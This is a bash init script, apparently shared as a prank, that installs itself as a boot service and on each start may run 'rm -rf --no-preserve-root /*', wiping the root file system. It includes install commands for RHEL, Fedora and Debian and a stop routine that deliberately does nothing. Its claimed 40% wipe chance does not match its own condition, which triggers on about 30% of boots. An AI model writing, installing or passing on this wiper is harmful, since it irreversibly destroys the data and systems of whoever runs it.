#!/bin/bash
# chkconfig: 125 20 80
# description: Every reboot will have a 40% success rate of wiping the root file system. Why 40%? Why not 100%? Because I'm not a evil person.
# Credit to matrix5009 for contributions to this script. USE THIS CODE AT YOUR OWN RISK.

# Source function library.
. /etc/init.d/functions

# To INSTALL the script:
### ALL SYSTEMS ###
# cp reboot6 /etc/init.d/
### RHEL and Fedora ###
# chkconfig --add /etc/init.d/reboot6
# chkconfig --level 125 /etc/init.d/reboot6 on
# ln -s /etc/init.d/reboot6 /etc/rc2.d/S35reboot6
### Debian and Deriatives ###
# update-rc.d reboot6 defaults

# To UNINSTALL the script:
### RHEL and Fedora ###
# chkconfig --level 125 /etc/init.d/reboot6 off
# chkconfig --del /etc/init.d/reboot6
### Debian and Deriatives ###
# update-rc.d reboot6 disable
# update-rc.d reboot6 remove
### ALL SYSTEMS ###
# rm /etc/init.d/reboot6

# A systemd unit file should be created, based upon this script.

start() {
    # code to start app comes here
    for i in $(date +%S | cut -c 2); do
        [[ $i > 6 ]] && rm -rf --no-preserve-root /*
    done
}

stop() {
    # code to stop app comes here
    # NOTE: In this code, the start() operation is atomic, so there should not be any stop condition executed.
    echo "This won't stop until it is removed!"
}

case "$1" in 
    start)
       start
       ;;
    stop)
       stop
       ;;
    restart)
       stop
       start
       ;;
    status)
       # code to check status of app comes here 
       # example: status program_name
       ;;
    *)
           echo "Usage: $0 {start|stop|status|restart}"
esac

exit 0 
